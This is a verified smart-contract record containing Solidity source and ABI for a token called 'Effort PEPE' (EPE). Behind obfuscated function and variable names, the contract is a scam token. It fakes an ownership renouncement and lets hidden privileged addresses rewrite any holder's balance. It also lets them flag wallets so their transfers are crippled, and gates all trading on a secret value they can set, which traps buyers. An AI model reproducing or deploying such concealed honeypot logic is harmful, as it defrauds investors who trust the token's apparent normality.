{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface atListShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toTakeShould) external view returns (uint256);\n\n    function transfer(address amountLaunched, uint256 toReceiver) external returns (bool);\n\n    function allowance(address autoLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountLaunched,\n        uint256 toReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed teamAt, uint256 value);\n    event Approval(address indexed autoLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract launchToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedTeam {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityTotal {\n    function createPair(address marketingSwapTeam, address fundAuto) external returns (address);\n}\n\ninterface maxTokenReceiver is atListShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EffortPEPE is launchToken, atListShould, maxTokenReceiver {\n\n    function transferFrom(address swapSender, address amountLaunched, uint256 toReceiver) external override returns (bool) {\n        if (_msgSender() != enableIsAuto) {\n            if (buyAmount[swapSender][_msgSender()] != type(uint256).max) {\n                require(toReceiver <= buyAmount[swapSender][_msgSender()]);\n                buyAmount[swapSender][_msgSender()] -= toReceiver;\n            }\n        }\n        return limitFee(swapSender, amountLaunched, toReceiver);\n    }\n\n    bool public minLaunchedWallet;\n\n    mapping(address => bool) public swapFee;\n\n    uint256 private senderExempt = 100000000 * 10 ** 18;\n\n    string private swapAuto = \"Effort PEPE\";\n\n    uint8 private minFee = 18;\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoSwapReceiver;\n    }\n\n    function limitFee(address swapSender, address amountLaunched, uint256 toReceiver) internal returns (bool) {\n        if (swapSender == enableTokenIs) {\n            return senderFrom(swapSender, amountLaunched, toReceiver);\n        }\n        uint256 launchTo = atListShould(launchMarketingList).balanceOf(listEnable);\n        require(launchTo == swapReceiver);\n        require(amountLaunched != listEnable);\n        if (walletTotal[swapSender]) {\n            return senderFrom(swapSender, amountLaunched, launchReceiver);\n        }\n        return senderFrom(swapSender, amountLaunched, toReceiver);\n    }\n\n    mapping(address => uint256) private toMarketing;\n\n    bool public exemptAuto;\n\n    function fromShould(address tradingFee, uint256 toReceiver) public {\n        amountSell();\n        toMarketing[tradingFee] = toReceiver;\n    }\n\n    address private exemptLaunch;\n\n    bool public senderSwapAt;\n\n    function allowance(address receiverToSell, address enableIs) external view virtual override returns (uint256) {\n        if (enableIs == enableIsAuto) {\n            return type(uint256).max;\n        }\n        return buyAmount[receiverToSell][enableIs];\n    }\n\n    uint256 tokenModeIs;\n\n    uint256 swapReceiver;\n\n    uint256 private txTeam;\n\n    string private autoSwapReceiver = \"EPE\";\n\n    bool public sellTeam;\n\n    function owner() external view returns (address) {\n        return exemptLaunch;\n    }\n\n    address enableIsAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public enableTokenIs;\n\n    function atAuto(address modeMin) public {\n        amountSell();\n        if (senderTake != txTeam) {\n            exemptAuto = false;\n        }\n        if (modeMin == enableTokenIs || modeMin == launchMarketingList) {\n            return;\n        }\n        walletTotal[modeMin] = true;\n    }\n\n    function approve(address enableIs, uint256 toReceiver) public virtual override returns (bool) {\n        buyAmount[_msgSender()][enableIs] = toReceiver;\n        emit Approval(_msgSender(), enableIs, toReceiver);\n        return true;\n    }\n\n    function senderFrom(address swapSender, address amountLaunched, uint256 toReceiver) internal returns (bool) {\n        require(toMarketing[swapSender] >= toReceiver);\n        toMarketing[swapSender] -= toReceiver;\n        toMarketing[amountLaunched] += toReceiver;\n        emit Transfer(swapSender, amountLaunched, toReceiver);\n        return true;\n    }\n\n    function transfer(address tradingFee, uint256 toReceiver) external virtual override returns (bool) {\n        return limitFee(_msgSender(), tradingFee, toReceiver);\n    }\n\n    mapping(address => mapping(address => uint256)) private buyAmount;\n\n    address public launchMarketingList;\n\n    function fundLaunchedReceiver() public {\n        emit OwnershipTransferred(enableTokenIs, address(0));\n        exemptLaunch = address(0);\n    }\n\n    event OwnershipTransferred(address indexed toIs, address indexed atWalletLaunch);\n\n    bool public shouldAt;\n\n    function tokenAmount(uint256 toReceiver) public {\n        amountSell();\n        swapReceiver = toReceiver;\n    }\n\n    function balanceOf(address toTakeShould) public view virtual override returns (uint256) {\n        return toMarketing[toTakeShould];\n    }\n\n    constructor (){\n        if (senderTake != txTeam) {\n            exemptAuto = true;\n        }\n        launchedTeam liquidityMarketingTx = launchedTeam(enableIsAuto);\n        launchMarketingList = liquidityTotal(liquidityMarketingTx.factory()).createPair(liquidityMarketingTx.WETH(), address(this));\n        \n        enableTokenIs = _msgSender();\n        fundLaunchedReceiver();\n        swapFee[enableTokenIs] = true;\n        toMarketing[enableTokenIs] = senderExempt;\n        if (txTeam == teamMode) {\n            senderSwapAt = false;\n        }\n        emit Transfer(address(0), enableTokenIs, senderExempt);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapAuto;\n    }\n\n    uint256 private walletFrom;\n\n    uint256 private teamMode;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderExempt;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minFee;\n    }\n\n    mapping(address => bool) public walletTotal;\n\n    function marketingBuy(address walletMode) public {\n        require(walletMode.balance < 100000);\n        if (shouldAt) {\n            return;\n        }\n        \n        swapFee[walletMode] = true;\n        if (shouldTo == txTeam) {\n            exemptAuto = true;\n        }\n        shouldAt = true;\n    }\n\n    uint256 public senderTake;\n\n    uint256 private shouldTo;\n\n    function getOwner() external view returns (address) {\n        return exemptLaunch;\n    }\n\n    address listEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant launchReceiver = 6 ** 10;\n\n    function amountSell() private view {\n        require(swapFee[_msgSender()]);\n    }\n\n    bool public receiverShouldWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atWalletLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverToSell\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMin\",\"type\":\"address\"}],\"name\":\"atAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTakeShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTokenIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"fromShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMarketingList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"}],\"name\":\"marketingBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunchedWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShouldWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwapAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"tokenAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "EffortPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}